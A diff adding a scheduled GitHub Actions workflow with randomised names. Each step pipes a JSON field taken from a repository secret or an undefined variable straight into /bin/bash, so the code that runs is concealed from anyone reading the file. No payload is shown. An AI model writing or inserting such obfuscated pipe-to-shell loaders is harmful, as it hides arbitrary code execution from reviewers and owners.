@@ -1,0 +1,27 @@
+name: yutongbbb
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yutongbbb
+        env:
+          yqqc156: ${{ secrets.yqqc156 }}
+        run: |
+          echo $yqqc156 | jq -r .j0401 | /bin/bash
+          echo $jb9 | jq -r .cfkm4227 | /bin/bash
+          echo $xvktf9684 | jq -r .wdono92 | /bin/bash
+          echo $wdi476 | jq -r .zdup96904 | /bin/bash
+          echo $wpfxd5 | jq -r .siccj5182 | /bin/bash
+          echo $wec72 | jq -r .rsqof5 | /bin/bash
+          echo $goscp2455 | jq -r .mquzd48 | /bin/bash
+          echo $qu53 | jq -r .uxtrw66 | /bin/bash
+          echo $zrfq59806 | jq -r .n1367 | /bin/bash
+          echo $uqgq95111 | jq -r .tbyj6561 | /bin/bash
+
